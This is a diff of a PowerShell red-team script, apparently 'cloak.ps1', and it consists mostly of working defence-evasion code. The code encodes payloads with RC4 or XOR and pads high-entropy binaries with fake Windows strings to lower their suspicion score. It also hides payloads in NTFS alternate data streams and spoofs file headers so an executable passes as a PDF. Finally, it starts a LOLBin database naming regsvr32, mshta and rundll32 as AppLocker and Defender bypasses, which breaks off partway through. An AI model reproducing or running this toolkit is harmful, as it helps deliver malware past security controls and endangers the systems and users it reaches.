@@ -1,53 +1,59 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Combined File Utility — Polyglot/Carrier Embedding + Encoding + Extension/Header Spoofing + Hashing
+    Red Team File Utility — Encoding + ADS + Entropy + Header Spoofing + Hashing + LOLBin Generator
 
 .DESCRIPTION
-    Merges two tools into one:
+    Two modes:
 
-      1. Polyglot / carrier embedding  (Embed, Extract, Info modes)
-      2. Multi-function file utility   (Encode, NewExtension, SpoofHeader, ShowHashes)
+      1. Info  — Inspect a file: size, entropy, first-byte fingerprint, known magic-byte match.
+      2. Util  — Encode, lower entropy, ADS read/write, rename extension, spoof header, show hashes.
 
-    You can chain operations in a single call, for example:
-      • Encode a payload, embed it into a carrier, rename + spoof header, then show hashes.
-
-    Embedding Strategies
-    --------------------
-    Append   – carrier | payload | trailer  (default; most parsers ignore trailing data)
-    Prepend  – trailer | payload | carrier  (formats parsed from the end, e.g. ZIP/RAR)
-    Insert   – payload injected at -InsertOffset inside the carrier
-
-    Encoding Techniques (interactive menu when -Encode is used)
+    Encoding Techniques (interactive menu when -Encode is used in Info or Util)
     -------------------
     1  Base64
     2  Hex
-    3  XOR  (key prompted)
+    3  XOR        (key prompted)
     4  Reverse bytes
     5  XOR → Base64
     6  XOR → Hex
+    7  RC4        (key prompted)
+
+    ADS — Alternate Data Streams (NTFS only)
+    -----------------------------------------
+    -AdsWrite  <payload>   Write a file into carrier:stream
+    -AdsRead               Read carrier:stream to -Output
+    -AdsList               List all streams on -Carrier
+    -AdsDelete             Delete carrier:stream
+    -AdsStream <name>      Stream name (required for Write/Read/Delete)
 
 .EXAMPLE
-    # Encode secret.bin, embed into photo.jpg, rename output to .pdf with spoofed header, show hashes
-    .\Invoke-FileUtil.ps1 -Mode Embed `
-        -Carrier photo.jpg -Payload secret.bin -Output result.pdf `
-        -Encode -SpoofHeader -ShowHashes
+    # Inspect a file (includes entropy score)
+    .\cloak.ps1 -Mode Info -Carrier payload.exe -ShowHashes
 
 .EXAMPLE
-    # Embed only (no encoding)
-    .\Invoke-FileUtil.ps1 -Mode Embed -Carrier carrier.png -Payload data.zip -Output poly.png
+    # RC4 encode
+    .\cloak.ps1 -Mode Util -Carrier document.txt -Encode
 
 .EXAMPLE
-    # Extract payload back out
-    .\Invoke-FileUtil.ps1 -Mode Extract -Carrier poly.png -Output recovered.zip
+    # Lower entropy then encode then rename
+    .\cloak.ps1 -Mode Util -Carrier payload.exe -LowerEntropy 6.0 -Encode -NewExtension ".pdf" -SpoofHeader
 
 .EXAMPLE
-    # Inspect a file for embedded marker
-    .\Invoke-FileUtil.ps1 -Mode Info -Carrier poly.png
+    # Write payload into ADS
+    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsWrite payload.enc -AdsStream hidden
 
 .EXAMPLE
-    # Encoding + extension spoof only (no embedding)
-    .\Invoke-FileUtil.ps1 -Mode Util -InputFile payload.exe -Encode -NewExtension ".jpg" -SpoofHeader -ShowHashes
+    # Read ADS stream back out
+    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsRead -AdsStream hidden -Output recovered.bin
+
+.EXAMPLE
+    # List all ADS streams on a file
+    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsList
+
+.EXAMPLE
+    # Delete an ADS stream
+    .\cloak.ps1 -Mode Util -Carrier readme.txt -AdsDelete -AdsStream hidden
 
 .NOTES
     For educational / research / CTF use.
@@ -57,57 +63,50 @@
 param(
     # ── Mode ────────────────────────────────────────────────────────────────
     [Parameter(Mandatory)]
-    [ValidateSet('Embed', 'Extract', 'Info', 'Util')]
+    [ValidateSet('Info', 'Util', 'Generate')]
     [string] $Mode,
 
-    # ── Polyglot params ─────────────────────────────────────────────────────
-    # Carrier file (also used as InputFile in Util mode)
+    # ── File params ──────────────────────────────────────────────────────────
     [string] $Carrier,
-
-    # Payload to embed (Embed mode)
-    [string] $Payload,
-
-    # Output file path (used by all modes)
     [string] $Output,
 
-    # Embedding strategy
-    [ValidateSet('Append', 'Prepend', 'Insert')]
-    [string] $Strategy = 'Append',
-
-    # Byte offset for Insert strategy
-    [long] $InsertOffset = 0,
-
-    # ── File-utility params ──────────────────────────────────────────────────
-    # Change file extension (e.g. ".pdf")
-    [string] $NewExtension,
-
-    # Append string to filename (e.g. ".bak")
-    [string] $AddExtension,
-
-    # Interactive encoding menu
+    # ── Encoding / processing ────────────────────────────────────────────────
     [switch] $Encode,
 
-    # Overwrite first bytes with magic bytes matching -NewExtension / -AddExtension
+    # Lower entropy: target Shannon entropy (e.g. 6.0). Applied before encoding.
+    # Default -1 means disabled.
+    [double] $LowerEntropy = -1,
+
+    # ── Extension / header ───────────────────────────────────────────────────
+    [string] $NewExtension,
+    [string] $AddExtension,
     [switch] $SpoofHeader,
 
-    # Show MD5 / SHA1 / SHA256 of the final file
+    # ── Output options ───────────────────────────────────────────────────────
     [switch] $ShowHashes,
+    [switch] $Quiet,
 
-    # Suppress decorative banner
-    [switch] $Quiet
+    # ── LOLBin generator ────────────────────────────────────────────────────────
+    [string] $LolBin,       # specific LOLBin name (optional — interactive menu if omitted)
+    [string] $LolBinFile,   # local payload file path
+    [string] $LolBinUrl,    # remote URL for download cradles
+    [string] $LolBinArg,    # extra argument (e.g. DLL export name)
+    [switch] $List,         # list all LOLBins and exit
+
+    # ── ADS params (NTFS only) ───────────────────────────────────────────────
+    [string] $AdsWrite,     # path to payload file to write into ADS
+    [switch] $AdsRead,      # read ADS stream → -Output
+    [switch] $AdsList,      # list all streams on -Carrier
+    [switch] $AdsDelete,    # delete a named stream
+    [string] $AdsStream     # stream name, e.g. 'hidden'
 )
 
 Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Stop'
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  SHARED CONSTANTS
+#  MAGIC BYTE MAP
 # ═══════════════════════════════════════════════════════════════════════════════
-
-$MAGIC       = [byte[]]@(0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE)
-$MAGIC_LEN   = $MAGIC.Length          # 8
-$SIZE_BYTES  = 8                       # int64-LE payload length field
-$TRAILER_LEN = $MAGIC_LEN + $SIZE_BYTES  # 16 bytes total
 
 $MagicBytes = @{
     ".pdf"    = [byte[]]@(0x25, 0x50, 0x44, 0x46)
@@ -171,46 +170,118 @@ function Format-Bytes([long]$n) {
     return '{0:N2} {1}' -f $d, $units[$i]
 }
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  POLYGLOT HELPERS
-# ═══════════════════════════════════════════════════════════════════════════════
-
-function New-Trailer([long]$PayloadLen) {
-    $lenBytes = [System.BitConverter]::GetBytes([int64]$PayloadLen)
-    if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($lenBytes) }
-    $t = New-Object byte[] $TRAILER_LEN
-    [Array]::Copy($MAGIC,    0, $t, 0,         $MAGIC_LEN)
-    [Array]::Copy($lenBytes, 0, $t, $MAGIC_LEN, $SIZE_BYTES)
-    return $t
-}
-
-# Returns a hashtable: @{ Offset = int; Layout = 'Append'|'Prepend' }
-# or $null if no marker is found.
-function Find-MagicOffset([byte[]]$Bytes) {
-    # --- Append: trailer sits at the very end ---
-    $tailPos = $Bytes.Length - $TRAILER_LEN
-    if ($tailPos -ge 0) {
-        $match = $true
-        for ($i = 0; $i -lt $MAGIC_LEN; $i++) {
-            if ($Bytes[$tailPos + $i] -ne $MAGIC[$i]) { $match = $false; break }
-        }
-        if ($match) { return @{ Offset = $tailPos; Layout = 'Append' } }
-    }
-
-    # --- Prepend: trailer sits at the very start ---
-    if ($Bytes.Length -ge $TRAILER_LEN) {
-        $match = $true
-        for ($i = 0; $i -lt $MAGIC_LEN; $i++) {
-            if ($Bytes[$i] -ne $MAGIC[$i]) { $match = $false; break }
-        }
-        if ($match) { return @{ Offset = 0; Layout = 'Prepend' } }
-    }
-
-    return $null
+function Show-Hashes([string]$FilePath) {
+    Write-Host ""
+    Write-Host "  Hashes for: $FilePath" -ForegroundColor Cyan
+    Write-Host "  MD5:    $(( Get-FileHash $FilePath -Algorithm MD5    ).Hash)"
+    Write-Host "  SHA1:   $(( Get-FileHash $FilePath -Algorithm SHA1   ).Hash)"
+    Write-Host "  SHA256: $(( Get-FileHash $FilePath -Algorithm SHA256 ).Hash)"
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  FILE-UTILITY HELPERS
+#  ENTROPY
+# ═══════════════════════════════════════════════════════════════════════════════
+
+function Get-Entropy([byte[]]$Bytes) {
+    if ($Bytes.Length -eq 0) { return 0.0 }
+    $counts = @(0) * 256
+    foreach ($b in $Bytes) { $counts[$b]++ }
+    $n = $Bytes.Length; $entropy = 0.0
+    foreach ($c in $counts) {
+        if ($c -gt 0) {
+            $p = $c / $n
+            $entropy -= $p * [Math]::Log($p, 2)
+        }
+    }
+    return [Math]::Round($entropy, 3)
+}
+
+# Structured low-entropy junk patterns — mirrors cloak.py
+$JunkPatterns = @(
+    [byte[]]( ,0x00 * 64 ),
+    [byte[]]( ,0x20 * 64 ),
+    [System.Text.Encoding]::ASCII.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
+    [byte[]]( @(0xFF,0xFE) * 32 ),
+    [byte[]]( ,0x90 * 64 ),
+    [System.Text.Encoding]::ASCII.GetBytes("Copyright (c) Microsoft Corporation. All rights reserved.       "),
+    [System.Text.Encoding]::ASCII.GetBytes("This program cannot be run in DOS mode.                         "),
+    [byte[]]( @(0x00,0xFF) * 32 )
+)
+
+function Invoke-LowerEntropy {
+    param([byte[]]$Data, [double]$Target)
+
+    $current = Get-Entropy $Data
+    if ($current -le $Target) {
+        Write-Host "[*] Entropy already $current — no padding needed." -ForegroundColor Cyan
+        return $Data
+    }
+
+    Write-Host "[*] Current entropy : $current" -ForegroundColor Cyan
+    Write-Host "[*] Target entropy  : $Target"  -ForegroundColor Cyan
+
+    $result     = [System.Collections.Generic.List[byte]]::new()
+    $result.AddRange($Data)
+    $maxSize    = $Data.Length * 4
+    $patternIdx = 0
+    $iterations = 0
+
+    while ((Get-Entropy $result.ToArray()) -gt $Target) {
+        if ($result.Count -ge $maxSize) {
+            Write-Host "  [~] Reached 4x size limit — stopping early." -ForegroundColor DarkYellow
+            break
+        }
+        $block = $JunkPatterns[$patternIdx % $JunkPatterns.Count]
+        $result.AddRange($block)
+        $patternIdx++; $iterations++
+    }
+
+    $final   = $result.ToArray()
+    $finalEn = Get-Entropy $final
+    $added   = $final.Length - $Data.Length
+    Write-Host "[+] Entropy reduced : $current → $finalEn" -ForegroundColor Green
+    Write-Host "[+] Padding added   : $(Format-Bytes $added) ($iterations blocks)" -ForegroundColor Green
+    return $final
+}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  RC4
+# ═══════════════════════════════════════════════════════════════════════════════
+
+function Invoke-RC4 {
+    param([byte[]]$Data, [byte[]]$Key)
+    $S = 0..255; $j = 0
+    for ($i = 0; $i -lt 256; $i++) {
+        $j = ($j + $S[$i] + $Key[$i % $Key.Length]) % 256
+        $S[$i], $S[$j] = $S[$j], $S[$i]
+    }
+    $i = 0; $j = 0
+    $out = [byte[]]::new($Data.Length)
+    for ($idx = 0; $idx -lt $Data.Length; $idx++) {
+        $i = ($i + 1) % 256
+        $j = ($j + $S[$i]) % 256
+        $S[$i], $S[$j] = $S[$j], $S[$i]
+        $out[$idx] = $Data[$idx] -bxor $S[($S[$i] + $S[$j]) % 256]
+    }
+    return $out
+}
+
+function Read-RC4Key {
+    $raw = (Read-Host "  RC4 key (string or hex e.g. 0xDEADBEEF)").Trim()
+    if ($raw -match '^0x([0-9A-Fa-f]+)$') {
+        $hex = $Matches[1]
+        if ($hex.Length % 2) { $hex = "0$hex" }
+        $keyBytes = [byte[]]::new($hex.Length / 2)
+        for ($i = 0; $i -lt $keyBytes.Length; $i++) {
+            $keyBytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
+        }
+        return $keyBytes
+    }
+    return [System.Text.Encoding]::UTF8.GetBytes($raw)
+}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  MAGIC BYTE SPOOFING
 # ═══════════════════════════════════════════════════════════════════════════════
 
 function Set-MagicBytes {
@@ -230,6 +301,10 @@ function Set-MagicBytes {
     Write-Host "  [+] Magic bytes set for '$Extension': $($magic | ForEach-Object { '0x{0:X2}' -f $_ })" -ForegroundColor Green
 }
 
+# ═══════════════════════════════════════════════════════════════════════════════
+#  ENCODING MENU
+# ═══════════════════════════════════════════════════════════════════════════════
+
 function Invoke-EncodingMenu {
     param([string]$FilePath)
 
@@ -241,12 +316,13 @@ function Invoke-EncodingMenu {
     Write-Host "  │  [2] Hex                      │" -ForegroundColor Magenta
     Write-Host "  │  [3] XOR  (key prompted)      │" -ForegroundColor Magenta
     Write-Host "  │  [4] Reverse bytes            │" -ForegroundColor Magenta
-    Write-Host "  │  [5] Base64 + XOR             │" -ForegroundColor Magenta
-    Write-Host "  │  [6] XOR  + Hex               │" -ForegroundColor Magenta
+    Write-Host "  │  [5] XOR → Base64             │" -ForegroundColor Magenta
+    Write-Host "  │  [6] XOR → Hex                │" -ForegroundColor Magenta
+    Write-Host "  │  [7] RC4  (key prompted)      │" -ForegroundColor Magenta
     Write-Host "  └───────────────────────────────┘" -ForegroundColor Magenta
-    $choice = Read-Host "  Select technique [1-6]"
+    $choice = Read-Host "  Select technique [1-7]"
 
-    $bytes    = [System.IO.File]::ReadAllBytes($FilePath)
+    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
     $encoded  = $null
     $isBinary = $false
 
@@ -261,7 +337,7 @@ function Invoke-EncodingMenu {
         }
         "3" {
             $keyInput = Read-Host "  XOR key (hex e.g. 0x41 or decimal e.g. 65)"
-            $key = if ($keyInput -match '^0x') { [Convert]::ToByte($keyInput, 16) } else { [byte]$keyInput }
+            $key      = if ($keyInput -match '^0x') { [Convert]::ToByte($keyInput, 16) } else { [byte]$keyInput }
             $encoded  = [byte[]]($bytes | ForEach-Object { $_ -bxor $key })
             $isBinary = $true
             Write-Host "  [+] XOR applied (key 0x$( '{0:X2}' -f $key ))." -ForegroundColor Green
@@ -286,6 +362,12 @@ function Invoke-EncodingMenu {
             $encoded  = ($xored | ForEach-Object { '{0:X2}' -f $_ }) -join ''
             Write-Host "  [+] XOR (0x$( '{0:X2}' -f $key )) → Hex applied." -ForegroundColor Green
         }
+        "7" {
+            $key      = Read-RC4Key
+            $encoded  = Invoke-RC4 -Data $bytes -Key $key
+            $isBinary = $true
+            Write-Host "  [+] RC4 applied (key length $($key.Length) bytes)." -ForegroundColor Green
+        }
         default {
             Write-Warning "Invalid selection — no encoding applied."
             return $FilePath
@@ -300,184 +382,127 @@ function Invoke-EncodingMenu {
     return $out
 }
 
-function Show-Hashes([string]$FilePath) {
+# ═══════════════════════════════════════════════════════════════════════════════
+#  ADS — ALTERNATE DATA STREAMS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+function Invoke-AdsWrite {
+    param([string]$CarrierPath, [string]$StreamName, [string]$PayloadPath)
+    $payload = Get-FileBytes $PayloadPath
+    $adsPath = "${CarrierPath}:${StreamName}"
+    $fs      = [System.IO.File]::OpenWrite($adsPath)
+    $fs.Write($payload, 0, $payload.Length)
+    $fs.Close()
+    Write-Host "[+] Stream written  : $adsPath  ($(Format-Bytes $payload.Length))" -ForegroundColor Green
+    Write-Host "[*] Tip: visible only via  dir /r  or  Get-Item -Stream *" -ForegroundColor Cyan
+}
+
+function Invoke-AdsRead {
+    param([string]$CarrierPath, [string]$StreamName, [string]$OutputPath)
+    $adsPath = "${CarrierPath}:${StreamName}"
+    $check   = Get-Item -Path $CarrierPath -Stream $StreamName -ErrorAction SilentlyContinue
+    if (-not $check) {
+        throw "Stream '$StreamName' not found on '$CarrierPath'. Use -AdsList to see available streams."
+    }
+    $fs  = [System.IO.File]::OpenRead($adsPath)
+    $ms  = [System.IO.MemoryStream]::new()
+    $fs.CopyTo($ms); $fs.Close()
+    $data = $ms.ToArray()
+    Write-FileBytes $OutputPath $data
+    Write-Host "[+] Stream read     : $adsPath  ($(Format-Bytes $data.Length))" -ForegroundColor Green
+    Write-Host "[+] Written to      : $OutputPath" -ForegroundColor Green
+}
+
+function Invoke-AdsList {
+    param([string]$CarrierPath)
+    $streams = Get-Item -Path $CarrierPath -Stream * -ErrorAction Stop
     Write-Host ""
-    Write-Host "  Hashes for: $FilePath" -ForegroundColor Cyan
-    Write-Host "  MD5:    $(( Get-FileHash $FilePath -Algorithm MD5    ).Hash)"
-    Write-Host "  SHA1:   $(( Get-FileHash $FilePath -Algorithm SHA1   ).Hash)"
-    Write-Host "  SHA256: $(( Get-FileHash $FilePath -Algorithm SHA256 ).Hash)"
+    Write-Host "  ADS streams on: $CarrierPath" -ForegroundColor Cyan
+    $streams | Format-Table Stream, Length -AutoSize | Out-Host
+}
+
+function Invoke-AdsDelete {
+    param([string]$CarrierPath, [string]$StreamName)
+    Remove-Item -Path $CarrierPath -Stream $StreamName -ErrorAction Stop
+    Write-Host "[+] Stream deleted  : ${CarrierPath}:${StreamName}" -ForegroundColor Green
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  POLYGLOT OPERATIONS
+#  INFO
 # ═══════════════════════════════════════════════════════════════════════════════
-
-function Invoke-Embed {
-    [CmdletBinding(SupportsShouldProcess)]
-    param([string]$CarrierPath, [string]$PayloadPath, [string]$OutPath)
-
-    $carrierBytes = Get-FileBytes $CarrierPath
-    $payloadBytes = Get-FileBytes $PayloadPath
-    $trailer      = New-Trailer $payloadBytes.Length
-
-    Write-Host "[*] Carrier  : $CarrierPath  ($(Format-Bytes $carrierBytes.Length))" -ForegroundColor Green
-    Write-Host "[*] Payload  : $PayloadPath  ($(Format-Bytes $payloadBytes.Length))" -ForegroundColor Green
-    Write-Host "[*] Strategy : $Strategy" -ForegroundColor Green
-
-    switch ($Strategy) {
-        'Append' {
-            $total  = $carrierBytes.Length + $payloadBytes.Length + $TRAILER_LEN
-            $result = New-Object byte[] $total
-            [Array]::Copy($carrierBytes, 0, $result, 0,                                          $carrierBytes.Length)
-            [Array]::Copy($payloadBytes, 0, $result, $carrierBytes.Length,                       $payloadBytes.Length)
-            [Array]::Copy($trailer,      0, $result, $carrierBytes.Length + $payloadBytes.Length, $TRAILER_LEN)
-        }
-        'Prepend' {
-            $total  = $TRAILER_LEN + $payloadBytes.Length + $carrierBytes.Length
-            $result = New-Object byte[] $total
-            [Array]::Copy($trailer,      0, $result, 0,                                          $TRAILER_LEN)
-            [Array]::Copy($payloadBytes, 0, $result, $TRAILER_LEN,                               $payloadBytes.Length)
-            [Array]::Copy($carrierBytes, 0, $result, $TRAILER_LEN + $payloadBytes.Length,        $carrierBytes.Length)
-        }
-        'Insert' {
-            if ($InsertOffset -gt $carrierBytes.Length) {
-                throw "InsertOffset ($InsertOffset) exceeds carrier length ($($carrierBytes.Length))."
-            }
-            $total     = $carrierBytes.Length + $payloadBytes.Length + $TRAILER_LEN
-            $result    = New-Object byte[] $total
-            $remaining = $carrierBytes.Length - $InsertOffset
-            [Array]::Copy($carrierBytes, 0,             $result, 0,                                                 $InsertOffset)
-            [Array]::Copy($payloadBytes, 0,             $result, $InsertOffset,                                     $payloadBytes.Length)
-            [Array]::Copy($trailer,      0,             $result, $InsertOffset + $payloadBytes.Length,             $TRAILER_LEN)
-            [Array]::Copy($carrierBytes, $InsertOffset, $result, $InsertOffset + $payloadBytes.Length + $TRAILER_LEN, $remaining)
-        }
-    }
-
-    if ($PSCmdlet.ShouldProcess($OutPath, "Write polyglot file")) {
-        Write-FileBytes $OutPath $result
-        Write-Host "[+] Polyglot written → $OutPath  ($(Format-Bytes $result.Length))" -ForegroundColor Yellow
-    }
-
-    return $OutPath
-}
-
-function Invoke-Extract {
-    [CmdletBinding(SupportsShouldProcess)]
-    param([string]$CarrierPath, [string]$OutPath)
-
-    $poly   = Get-FileBytes $CarrierPath
-    $found  = Find-MagicOffset $poly
-    if ($null -eq $found) {
-        throw "Magic marker not found in '$CarrierPath'. File may not contain an embedded payload, or was embedded with the Insert strategy (not auto-detectable)."
-    }
-
-    $layout    = $found.Layout
-    $trailerAt = $found.Offset
-
-    # Read payload length from the 8 bytes after the magic marker
-    $lenOffset  = $trailerAt + $MAGIC_LEN
-    $lenBytes   = $poly[$lenOffset..($lenOffset + $SIZE_BYTES - 1)]
-    if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($lenBytes) }
-    $payloadLen = [System.BitConverter]::ToInt64($lenBytes, 0)
-
-    if ($payloadLen -le 0) { throw "Corrupt trailer: payload length is zero or negative." }
-
-    # Slice payload — position depends on layout
-    switch ($layout) {
-        'Append' {
-            # Layout: [ carrier ][ payload ][ trailer ]
-            $payloadStart = $trailerAt - $payloadLen
-            if ($payloadStart -lt 0) { throw "Corrupt trailer: Append payload start is negative." }
-            $extracted = $poly[$payloadStart..($payloadStart + $payloadLen - 1)]
-        }
-        'Prepend' {
-            # Layout: [ trailer ][ payload ][ carrier ]
-            $payloadStart = $TRAILER_LEN
-            $payloadEnd   = $payloadStart + $payloadLen - 1
-            if ($payloadEnd -ge $poly.Length) { throw "Corrupt trailer: Prepend payload end exceeds file size." }
-            $extracted = $poly[$payloadStart..$payloadEnd]
-        }
-    }
-
-    $offsetDisplay = if ($layout -eq 'Append') { $trailerAt - $payloadLen } else { $TRAILER_LEN }
-    Write-Host "[*] Polyglot : $CarrierPath  ($(Format-Bytes $poly.Length))" -ForegroundColor Green
-    Write-Host "[*] Layout   : $layout" -ForegroundColor Green
-    Write-Host "[*] Payload  : $(Format-Bytes $payloadLen) at byte offset $offsetDisplay" -ForegroundColor Green
-
-    if ($PSCmdlet.ShouldProcess($OutPath, "Write extracted payload")) {
-        Write-FileBytes $OutPath $extracted
-        Write-Host "[+] Payload extracted → $OutPath  ($(Format-Bytes $extracted.Length))" -ForegroundColor Yellow
-    }
-
-    return $OutPath
-}
 
 function Invoke-Info {
     param([string]$FilePath)
     $bytes = Get-FileBytes $FilePath
-    $found = Find-MagicOffset $bytes
 
-    Write-Host "[*] File  : $FilePath" -ForegroundColor Cyan
-    Write-Host "[*] Size  : $(Format-Bytes $bytes.Length)" -ForegroundColor Cyan
+    Write-Host "[*] File           : $FilePath" -ForegroundColor Cyan
+    Write-Host "[*] Size           : $(Format-Bytes $bytes.Length) ($($bytes.Length) bytes)" -ForegroundColor Cyan
 
-    if ($null -eq $found) {
-        Write-Host "[-] No magic marker detected (checked both head and tail)." -ForegroundColor DarkGray
-    } else {
-        $layout    = $found.Layout
-        $trailerAt = $found.Offset
+    # Entropy
+    $entropy = Get-Entropy $bytes
+    $label   = if ($entropy -lt 6.5)  { "low — looks benign" }
+               elseif ($entropy -lt 7.2) { "medium — mildly suspicious" }
+               else { "high — likely packed/encrypted" }
+    $color   = if ($entropy -lt 6.5) { "Green" } elseif ($entropy -lt 7.2) { "Yellow" } else { "Red" }
+    Write-Host "[*] Entropy        : $entropy / 8.0  ($label)" -ForegroundColor $color
 
-        $lenOffset  = $trailerAt + $MAGIC_LEN
-        $lenBytes   = $bytes[$lenOffset..($lenOffset + $SIZE_BYTES - 1)]
-        if (-not [System.BitConverter]::IsLittleEndian) { [Array]::Reverse($lenBytes) }
-        $payloadLen = [System.BitConverter]::ToInt64($lenBytes, 0)
+    # First 16 bytes
+    $preview    = $bytes[0..([Math]::Min(15, $bytes.Length - 1))]
+    $hexPreview = ($preview | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
+    Write-Host "[*] First 16 bytes : $hexPreview" -ForegroundColor Cyan
 
-        switch ($layout) {
-            'Append' {
-                $carrierLen    = $bytes.Length - $payloadLen - $TRAILER_LEN
-                $payloadOffset = $trailerAt - $payloadLen
+    # Magic byte match
+    $matched = @()
+    foreach ($entry in $MagicBytes.GetEnumerator()) {
+        $magic = $entry.Value
+        if ($bytes.Length -ge $magic.Length) {
+            $match = $true
+            for ($i = 0; $i -lt $magic.Length; $i++) {
+                if ($bytes[$i] -ne $magic[$i]) { $match = $false; break }
             }
-            'Prepend' {
-                $carrierLen    = $bytes.Length - $payloadLen - $TRAILER_LEN
-                $payloadOffset = $TRAILER_LEN
-            }
+            if ($match) { $matched += $entry.Key }
         }
-
-        Write-Host "[+] Layout detected              : $layout" -ForegroundColor Green
-        Write-Host "    Magic marker at offset       : $trailerAt" -ForegroundColor Green
-        Write-Host "    Payload at offset            : $payloadOffset" -ForegroundColor Green
-        Write-Host "    Carrier portion              : $(Format-Bytes $carrierLen)" -ForegroundColor Green
-        Write-Host "    Payload portion              : $(Format-Bytes $payloadLen)" -ForegroundColor Green
-        Write-Host "    Trailer                      : $TRAILER_LEN bytes" -ForegroundColor Green
+    }
+    if ($matched.Count -gt 0) {
+        Write-Host "[+] Header matches known format(s): $($matched -join ', ')" -ForegroundColor Green
+    } else {
+        Write-Host "[~] Header does not match any known magic bytes in the map." -ForegroundColor DarkYellow
     }
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  SHARED POST-PROCESSING  (encoding → extension rename → header spoof → hashes)
-#  Used by both Embed and Util modes on the working file.
+#  POST-PROCESSING  (entropy → encode → rename → spoof → hashes → cleanup)
 # ═══════════════════════════════════════════════════════════════════════════════
 
 function Invoke-PostProcess {
     param(
         [string]   $WorkFile,
-        [string[]] $ProtectedFiles = @()   # files that must never be deleted (originals)
+        [string[]] $ProtectedFiles = @()
     )
 
-    # Track every intermediate file created so we can clean them up at the end.
-    # Only files we create are added — originals and the final output are never deleted.
     $temps = [System.Collections.Generic.List[string]]::new()
 
-    # 1. Optional encoding (interactive) — saves .enc temp, we track it
+    # 1. Entropy reduction
+    if ($LowerEntropy -ge 0) {
+        $data    = Get-FileBytes $WorkFile
+        $padded  = Invoke-LowerEntropy -Data $data -Target $LowerEntropy
+        $outPath = "$WorkFile.padded"
+        Write-FileBytes $outPath $padded
+        Write-Host "  [+] Padded file saved → $outPath" -ForegroundColor Green
+        $temps.Add([System.IO.Path]::GetFullPath($outPath))
+        $WorkFile = $outPath
+    }
+
+    # 2. Encoding (interactive menu)
     if ($Encode) {
         $prev     = $WorkFile
         $WorkFile = Invoke-EncodingMenu -FilePath $WorkFile
-        # If encoding created a new file (different path), mark the enc file as temp
         $resolvedPrev = (Resolve-Path $prev).Path
         $resolvedCurr = [System.IO.Path]::GetFullPath($WorkFile)
         if ($resolvedPrev -ne $resolvedCurr) { $temps.Add($resolvedCurr) }
     }
 
-    # 2. Change extension — replaces ALL existing extensions with the target.
-    #    e.g. testfile.bin.enc  -NewExtension .txt  →  testfile.txt
+    # 3. NewExtension — replaces ALL existing extensions
     if ($NewExtension) {
         $dir      = [System.IO.Path]::GetDirectoryName($WorkFile)
         $baseName = [System.IO.Path]::GetFileName($WorkFile)
@@ -492,10 +517,8 @@ function Invoke-PostProcess {
         if ($resolvedWork -ne $resolvedNew) {
             Copy-Item $WorkFile $newName -Force
             Write-Host "  [+] Extension replaced → $newName" -ForegroundColor Green
-            # Previous WorkFile is now superseded — mark it temp if we created it
             if ($temps.Contains($resolvedWork)) {
-                $null = $temps.Remove($resolvedWork)
-                $temps.Add($resolvedWork)   # keep in list so it gets deleted
+                $null = $temps.Remove($resolvedWork); $temps.Add($resolvedWork)
             }
         } else {
             Write-Host "  [~] Output already has target extension, skipping rename." -ForegroundColor DarkYellow
@@ -504,8 +527,7 @@ function Invoke-PostProcess {
         $WorkFile = $newName
     }
 
-    # 3. Append extension — adds to whatever the current filename already is.
-    #    e.g. testfile.txt  -AddExtension .bak  →  testfile.txt.bak
+    # 4. AddExtension — appends to existing filename
     if ($AddExtension) {
         $ext     = if ($AddExtension.StartsWith('.')) { $AddExtension } else { ".$AddExtension" }
         $newName = "$WorkFile$ext"
@@ -515,8 +537,7 @@ function Invoke-PostProcess {
             Copy-Item $WorkFile $newName -Force
             Write-Host "  [+] Extension appended → $newName" -ForegroundColor Green
             if ($temps.Contains($resolvedWork)) {
-                $null = $temps.Remove($resolvedWork)
-                $temps.Add($resolvedWork)
+                $null = $temps.Remove($resolvedWork); $temps.Add($resolvedWork)
             }
         } else {
             Write-Host "  [~] File already has that appended extension, skipping." -ForegroundColor DarkYellow
@@ -525,10 +546,10 @@ function Invoke-PostProcess {
         $WorkFile = $newName
     }
 
-    # 4. Hashes
+    # 5. Hashes
     if ($ShowHashes) { Show-Hashes $WorkFile }
 
-    # 5. Clean up all temp files — skip originals, skip the final output
+    # 6. Cleanup temps — never delete originals or final output
     $finalResolved = [System.IO.Path]::GetFullPath($WorkFile)
     foreach ($tmp in $temps) {
         $tmpResolved = [System.IO.Path]::GetFullPath($tmp)
@@ -542,6 +563,262 @@ function Invoke-PostProcess {
     return $WorkFile
 }
 
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  LOLBIN GENERATOR
+# ═══════════════════════════════════════════════════════════════════════════════
+
+$LolBinDB = [ordered]@{
+    rundll32    = @{ Desc='Execute DLL export or scriptlet via COM';                        OS='All Windows';                                    Note='Heavily monitored — combine with obfuscation';                              Types=@('.dll','.sct','.hta') }
+    regsvr32    = @{ Desc='Register/execute DLL or remote scriptlet (squiblydoo)';         OS='All Windows';                                    Note='Classic AppLocker bypass — ASR rules may block on Defender ATP';            Types=@('.dll','.sct') }
+    mshta       = @{ Desc='Execute HTA application — bypasses AppLocker';                  OS='All Windows';                                    Note='Often blocked by ASR rules in Defender ATP';                                Types=@('.hta','.sct','.vbs') }
+    wmic        = @{ Desc='Execute XSL transform or process creation';                     OS='REMOVED in Win 11 22H2+ / Server 2025';          Note='Still works on Win 10, Server 2016/2019/2022';                              Types=@('.xsl','.exe','.sct') }
